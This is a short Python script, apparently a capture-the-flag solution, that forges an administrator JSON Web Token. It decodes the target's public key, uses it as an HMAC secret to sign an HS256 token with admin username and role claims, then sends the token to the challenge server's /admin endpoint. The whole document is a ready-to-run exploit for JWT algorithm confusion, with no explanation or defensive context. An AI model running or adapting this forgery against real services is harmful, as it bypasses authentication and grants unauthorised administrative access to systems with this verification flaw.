import jwt
import requests
import base64
import re

url = "http://chals.bitskrieg.in:3005"


# Load the public key
with open("public-key.crt", "r") as f:
    pem_data = f.read()

# Remove the header and footer
pem_body = re.sub(r"-----.*?-----", "", pem_data, flags=re.DOTALL).strip()

# Decode from Base64 to raw bytes (HMAC secret key)
hmac_secret = base64.b64decode(pem_body)


token = jwt.encode(
    {"username": "admin", "role": "admin", "iat": 1749015184}, 
    hmac_secret, 
    algorithm="HS256"
)

forged = b"Bearer " + token
forged = forged.decode("utf-8") 
print("[*] Forged Token:", forged)

response = requests.get(url + "/admin", headers={"Authorization": forged})

print("[*] Server Response:", response.text)
